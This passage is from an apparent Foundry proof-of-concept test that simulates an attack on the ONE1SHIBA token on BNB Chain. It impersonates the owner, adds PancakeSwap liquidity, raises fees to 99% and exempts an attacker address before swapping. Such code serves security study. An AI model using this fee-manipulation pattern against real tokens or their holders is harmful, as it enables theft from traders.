        uint256 initialBalance = address(attacker).balance;

        // 1. Become owner (impersonate)
        address tokenOwner = IONE1SHIBA(TARGET).owner();
        vm.startPrank(tokenOwner);

        // 2. First, add initial liquidity so we can swap later
        // Owner has all tokens initially
        uint256 ownerTokenBalance = IERC20(TARGET).balanceOf(tokenOwner);
        console.log("Owner token balance:", ownerTokenBalance);

        // Approve router to spend tokens
        IERC20(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, ownerTokenBalance / 10);

        // Add liquidity with 10 BNB
        (uint amountToken, uint amountETH, uint liquidity) = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).addLiquidityETH{value: 10 ether}(
            TARGET,
            ownerTokenBalance / 10,
            0,
            0,
            tokenOwner,
            block.timestamp + 1000
        );

        // 3. Set extremely high fees
        IONE1SHIBA(TARGET).setTaxFeePercent(99);
        IONE1SHIBA(TARGET).setLiquidityFeePercent(99);

        // Also exclude attacker from fees so we don't pay fees when receiving tokens back
        IONE1SHIBA(TARGET).excludeFromFee(attacker);

        vm.stopPrank();

        // 4. Get some tokens by swapping BNB for tokens
        vm.startPrank(attacker);
        IERC20(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);

        // Swap 5 BNB for tokens
        address[] memory path = new address[](2);
        path[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
        path[1] = TARGET;

